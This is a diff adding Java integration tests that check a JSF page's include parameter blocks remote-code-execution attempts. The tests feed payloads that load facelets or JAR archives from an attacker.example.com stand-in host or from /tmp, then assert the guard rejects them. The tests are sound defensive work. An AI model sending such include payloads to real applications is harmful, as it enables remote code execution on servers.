@@ -86,6 +86,46 @@ public class UiIncludeRceIT extends BaseIT {
         assertBlocked(getPageSource());
     }
 
+    @Test
+    public void testProtocolRelative() {
+        open("param.jsf?p=//attacker.example.com/evil.xhtml");
+        assertBlocked(getPageSource());
+    }
+
+    // ── Includes from a facelet which is itself served from a JAR ──
+
+    @Test
+    public void testJarHostedLocalInclude() {
+        open("jarParam.jsf?p=jarLocal.xhtml");
+        assertTrue(getPageSource().contains("safe from jar"));
+    }
+
+    /**
+     * A container which serves a JAR hosted facelet under the "jar" scheme gives it a null authority, which must not
+     * let a remote archive pass as the archive the including facelet itself lives in. Asserted on the guard's own
+     * message rather than through {@link #assertBlocked(String)}, because a rejected include and a failed attempt to
+     * fetch the remote archive both end up as an error page.
+     */
+    @Test
+    public void testJarHostedRemoteArchive() {
+        open("jarParam.jsf?p=jar:https://attacker.example.com/evil.jar!/evil.xhtml");
+        assertRejectedAsForeignOrigin(getPageSource());
+    }
+
+    @Test
+    public void testJarHostedOtherLocalArchive() {
+        open("jarParam.jsf?p=jar:file:///tmp/evil.jar!/evil.xhtml");
+        assertRejectedAsForeignOrigin(getPageSource());
+    }
+
+    private void assertRejectedAsForeignOrigin(String source) {
+        assertTrue(
+            source.contains("must be a relative path within the application"),
+            "Include should have been rejected before the archive was opened, but page source was: "
+                + source.substring(0, Math.min(500, source.length()))
+        );
+    }
+
     // ── Path traversal variants ──
 
     @Test
